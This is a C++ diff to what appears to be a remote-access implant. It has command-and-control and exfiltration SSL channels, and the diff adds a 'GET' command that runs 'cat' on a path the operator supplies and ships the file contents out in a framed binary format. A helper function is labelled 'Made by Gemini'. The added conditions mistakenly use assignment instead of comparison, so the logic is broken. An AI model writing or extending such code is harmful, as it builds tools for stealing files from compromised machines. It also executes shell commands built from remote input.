@@ -57,6 +57,27 @@ std::string exec(const char* cmd) {
     return r;
 }
 
+/* Made by Gemini */
+bool send_all_ssl(SSL* ssl, const char* data, int total_size) {
+    int bytes_sent = 0;
+    while (bytes_sent < total_size) {
+        // Try to send the remaining slice of the buffer
+        int result = SSL_write(ssl, data + bytes_sent, total_size - bytes_sent);
+        
+        if (result <= 0) {
+            int err = SSL_get_error(ssl, result);
+            // Handle cases where the socket isn't ready or was closed
+            if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) {
+                continue; // Retry if it's a temporary block
+            }
+            // Real error occurred
+            return false;
+        }
+        bytes_sent += result;
+    }
+    return true;
+}
+
 void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     std::istringstream iss(msg);
     std::string keyword, id, data;
@@ -66,6 +87,7 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
 
     std::string c2_response;
     std::string exfil_data;
+    char type = 'T';
 
     if (keyword == "HELO") {
         c2_response = "HELLO " + id;
@@ -131,14 +153,31 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
         oss << "Details: " << result.details << "\n";
         oss << "=== END ===\n";
         exfil_data = oss.str();
+    } else if (keyword == "GET") {
+        type = 'F';
+        std::string full_cmd = "cat " + data;
+        exfil_data = exec(full_cmd.c_str());
     } else {
         c2_response = "ERR " + id;
     }
 
-    if (exfil_ssl && !exfil_data.empty()) {
+    if (exfil_ssl && !exfil_data.empty() && type = 'T') {
         SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
     }
-    // SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
+    
+    if (exfil_ssl && !exfil_data.empty() && type = 'F') {
+        uint32_t payload_size = htonl(static_cast<uint32_t>(exfil_data.size()));
+
+        std::vector<char> buffer;
+        buffer.reserve(5 + exfil_data.size());
+        buffer.push_back(type);
+
+        char* size_bytes = reinterpret_cast<char*>(&payload_size);
+        buffer.insert(buffer.end(), size_bytes, size_bytes + 4);
+        buffer.insert(buffer.end(), exfil_data.begin(), exfil_data.end());
+
+        send_all_ssl(exfil_ssl, buffer.data(), buffer.size());
+    }
 }
 
 SSL_CTX* createSSLContext() {
